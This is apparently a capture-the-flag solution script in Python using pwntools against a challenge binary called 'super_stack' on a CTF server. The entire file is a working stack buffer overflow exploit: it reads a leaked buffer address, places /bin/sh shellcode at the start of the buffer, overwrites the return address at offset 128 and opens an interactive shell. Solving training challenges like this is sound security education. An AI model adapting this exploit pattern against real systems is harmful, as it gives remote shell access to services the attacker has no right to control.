#!/bin/env python3
from pwn import *

exe = context.binary = ELF('super_stack')

io = remote('ctf.hackucf.org', 9005) #exe.process()
#shellcode of /bin/sh
# Thanks joe for the nifty shellcode
with open('compiled.txt', 'rb') as f:
	shellcode = f.read()

io.recvuntil('buf: ')
bufaddr = int(io.recvline().strip(), base=16)
offset = 128  # offset from start of buffer to return address
# Append the code that calls system("/bin/sh")
payload = fit({
    0: shellcode,
    100: bufaddr+132,
    offset: bufaddr 
})
io.sendline(payload)
io.interactive()